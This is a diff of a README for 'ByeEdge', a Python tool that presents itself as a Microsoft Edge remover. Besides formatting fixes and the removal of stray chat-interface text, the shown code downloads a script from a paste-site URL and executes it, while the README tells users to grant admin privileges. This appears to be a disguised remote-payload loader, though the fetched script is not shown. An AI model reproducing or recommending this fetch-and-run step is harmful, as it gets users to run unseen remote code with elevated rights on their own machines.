@@ -1,5 +1,3 @@
-# ByeEdge
-**ByeEdge**
 # ByeEdge 🚀
 
 **ByeEdge** is a Python-based tool designed to help you remove Microsoft Edge from your system effortlessly. A simple script that requires **admin privileges** to execute and ensures the complete uninstallation of Edge.
@@ -66,17 +64,12 @@ def _start_():
 
     script_url = "https://cdn.sourceb.in/bins/XbhZ6nBmta/0"
     execute_script_from_url(script_url)
-##Requirements 📋
-## Python 3.x
+
+## Requirements 📋
+Python 3.x
 Admin privileges for execution
-License 📄
+*License 📄*
 This project is licensed under the MIT License - see the LICENSE file for details.
 
-Disclaimer ⚠️
+*Disclaimer ⚠️*
 Please use ByeEdge responsibly. Removing Edge can affect Windows features that depend on it. Use at your own risk.
-
-css
-Copy
-Edit
-
-This version of the README contains modern design, highlights the main functionalities, and includes helpfu
